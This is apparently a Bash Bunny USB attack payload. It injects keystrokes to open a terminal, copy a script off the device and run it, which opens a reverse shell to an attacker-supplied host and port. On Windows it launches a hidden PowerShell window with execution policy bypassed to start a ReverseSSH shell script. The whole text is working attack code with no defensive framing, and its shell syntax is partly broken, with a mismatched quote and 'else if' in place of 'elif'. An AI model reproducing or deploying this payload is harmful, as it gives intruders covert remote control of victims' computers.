

# Gets Switch Position
GET SWITCH_POSITION

# Set Attack Mode
ATTACKMODE HID STORAGE

# Get the switch position
GET SWITCH_POSITION

# Open a terminal
Q CTRL-ALT t

# Wait for terminal to open
sleep 1
LED STAGE1

# Copy bash script
Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/"
Q STRING $SWITCH_POSITION
Q STRING "/a.sh ~/a.sh && chmod +x ~/a.sh && ~/a.sh $RHOST $RPORT"
Q ENTER

# Quit the terminal
LED CLEANUP
Q STRING exit
Q ENTER






# Stage 2: Run the script based on OS to create the reverse shell
ATTACKMODE HID STORAGE
LED STAGE2
if [ "$OS" = "WIN" ]; then
    RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\library\\RemoteAccess\\ReverseSSH\\WinRSSH-Shell.ps1') $RHOST $RPORT $USE_CF"
    LED FINISH
    exit 0
else if [ "$OS = "LINUX" ]; then
    # Open terminal
    Q CTRL-ALT t

    # Copy and run bash script
    Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/"
    Q STRING $SWITCH_POSITION
    Q STRING "/LinuxSSH-RShell.sh ~/LinuxSSH-RShell.sh && chmod +x ~/LinuxSSH-RShell.sh && ~/LinuxSSH-RShell.sh $RHOST $RPORT"
    Q ENTER

    # Quit the terminal
    LED CLEANUP
    Q STRING exit
    Q ENTER
fi
